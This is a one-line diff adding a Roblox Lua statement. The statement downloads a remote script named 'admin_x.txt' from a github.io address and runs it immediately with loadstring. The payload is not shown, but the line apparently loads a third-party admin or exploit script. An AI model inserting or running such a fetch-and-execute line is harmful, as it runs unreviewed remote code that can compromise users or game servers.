@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://troycla.github.io/ad-x/admin_x.txt'))()
